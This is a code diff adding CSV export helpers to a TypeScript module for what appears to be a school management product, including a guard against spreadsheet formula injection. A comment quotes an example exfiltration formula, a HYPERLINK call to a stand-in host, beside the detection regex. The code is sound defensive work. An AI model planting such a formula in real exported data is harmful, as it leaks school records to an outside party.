@@ -204,3 +204,73 @@ export function toCsv(headers: string[], rows: Array<Record<string, string>>): s
   for (const r of rows) lines.push(headers.map((h) => quote(r[h] ?? '')).join(','));
   return `﻿${lines.join('\r\n')}\r\n`;
 }
+
+/* ------------------------------------------------------------------------
+ * P11 - data portability.
+ *
+ * `toCsv` above builds one string and is right for the import error list,
+ * which is a handful of rows. An institution export is a different size and
+ * a different threat model, so the pieces below sit beside it rather than
+ * widening it: same quoting, same BOM, plus row-at-a-time emission and a
+ * formula guard.
+ * ---------------------------------------------------------------------- */
+
+/**
+ * The byte order mark, written once at the top of an export.
+ *
+ * Excel on a Bangladeshi office machine reads a BOM-less UTF-8 file in the
+ * system codepage and renders every Bangla name as mojibake. The school then
+ * believes the export is broken, which for their purposes it is.
+ */
+export const CSV_BOM = '\ufeff';
+
+/**
+ * Cells a spreadsheet would EXECUTE rather than display.
+ *
+ * A student's name is free text a person typed, and Excel, LibreOffice and
+ * Sheets all treat a leading =, +, -, @, tab or CR as the start of a
+ * formula. `=HYPERLINK("http://x/?"&A1)` sitting in a name field becomes a
+ * live exfiltration link the moment a clerk opens the file. The export is
+ * the delivery mechanism, so the export is where it has to be stopped.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * A number or an E.164 phone, which must NOT be defanged - see `csvCell`.
+ *
+ * The `+` matters as much as the `-`. Every staff and guardian phone in this
+ * product is stored E.164 (`+8801711000111`), so a naive guard would prefix
+ * an apostrophe onto every phone in every export. That is not merely ugly:
+ * this is a PORTABILITY feature, the file is meant to be readable back, and
+ * `parseCsv` would then hand the school `'+8801711000111` — a phone number
+ * that no longer dials. Fidelity of the value is the point of the artifact.
+ *
+ * Nothing is given up by the exemption. `+8801711000111` is all digits after
+ * the sign, so a spreadsheet evaluates it to the number 8801711000111 and
+ * there is no formula to execute; `+SUM(A1)` is not all digits and is still
+ * caught.
+ */
+const PLAIN_NUMBER = /^[+-]?\d+(?:\.\d+)?$/;
+
+/**
+ * One cell: neutralised if dangerous, quoted if it needs it, otherwise left
+ * exactly as the school typed it.
+ *
+ * The guard is deliberately narrow. Prefixing everything risky-looking with
+ * an apostrophe is the usual advice and it corrupts real data: -500 is a
+ * legitimate amount, and '-500 stops being a number in the spreadsheet the
+ * school is about to sum. So a purely numeric value is left alone - it
+ * cannot be a formula - and only text that genuinely leads with an operator
+ * is prefixed. Bangla never starts with one of these characters, so no
+ * Bangla name is ever touched.
+ */
+export function csvCell(value: string): string {
+  let v = value;
+  if (FORMULA_LEAD.test(v) && !PLAIN_NUMBER.test(v)) v = `'${v}`;
+  return /[",\r\n]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
+}
+
+/** One CRLF-terminated record. CRLF because that is what Excel expects. */
+export function csvLine(values: string[]): string {
+  return `${values.map(csvCell).join(',')}\r\n`;
+}
